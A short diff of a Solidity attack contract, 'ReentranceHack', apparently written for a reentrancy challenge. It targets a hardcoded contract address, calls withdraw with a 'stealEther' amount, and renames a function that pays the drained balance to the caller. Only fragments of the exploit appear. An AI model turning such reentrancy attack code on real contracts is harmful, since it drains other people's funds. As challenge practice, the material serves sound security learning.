@@ -7,7 +7,6 @@ interface IReentrance {
 }
 
 contract ReentranceHack {
-
     IReentrance public reentrance = IReentrance(0x5dDaC0eda308228eE2E7E0fDa641371Af40A3b8d);
     uint256 public stealEther = 1 ether;
 
@@ -16,7 +15,7 @@ contract ReentranceHack {
         reentrance.withdraw(stealEther);
     }
 
-    function withdrawEther() public {
+    function returnEther() public {
         (bool success, ) = msg.sender.call{value: address(this).balance}("");
         require(success);
     }
